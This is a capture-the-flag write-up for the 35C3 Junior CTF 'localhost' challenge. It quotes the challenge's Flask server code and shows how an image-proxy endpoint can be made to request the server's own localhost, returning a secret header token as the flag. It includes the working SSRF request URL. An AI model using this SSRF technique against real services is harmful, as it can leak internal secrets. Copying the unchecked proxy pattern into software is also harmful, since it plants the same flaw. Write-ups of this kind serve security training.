# 35C3 Junior CTF – localhost

## Challenge

> We came up with some ingenious solutions to the problem of password reuse. For users, we don't use password auth but send around mails instead. This works well for humans but not for robots. To make test automation possible, we didn't want to send those mails all the time, so instead we introduced the localhost header. If we send a request to our server from the same host, our state-of-the-art python server sets the localhost header to a secret only known to the server. This is bullet-proof, luckily.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

The header is set in the following method.

```Python
@app.after_request
def secure(response: Response):
    if not request.path[-3:] in ["jpg", "png", "gif"]:
        response.headers["X-Frame-Options"] = "SAMEORIGIN"
        response.headers["X-Xss-Protection"] = "1; mode=block"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"
        response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
        response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; " \
                                             "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \
                                             "fullscreen *; payment 'self'; "
        if request.remote_addr == "127.0.0.1":
            response.headers["X-Localhost-Token"] = LOCALHOST

    return response
```

The functionality that can be abused to generate a request from the same server is the following.

```Python
# Proxy images to avoid tainted canvases when thumbnailing.
@app.route("/api/proxyimage", methods=["GET"])
def proxyimage():
    url = request.args.get("url", '')
    parsed = parse.urlparse(url, "http")  # type: parse.ParseResult
    if not parsed.netloc:
        parsed = parsed._replace(netloc=request.host)  # type: parse.ParseResult
    url = parsed.geturl()

    resp = requests.get(url)
    if not resp.headers["Content-Type"].startswith("image/"):
        raise Exception("Not a valid image")

    # See https://stackoverflow.com/a/36601467/1345238
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.raw.headers.items()
               if name.lower() not in excluded_headers]

    response = Response(resp.content, resp.status_code, headers)
    return response
```

This is the functionality used by the `loadImage` method in the programming environment.

The server runs at what defined here:

```Python
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8075)
```

An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using `0.0.0.0` for the IP address).

```
http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg
```
    
The response will contain the flag.

```
X-Localhost-Token: 35C3_THIS_HOST_IS_YOUR_HOST_THIS_HOST_IS_LOCAL_HOST
```
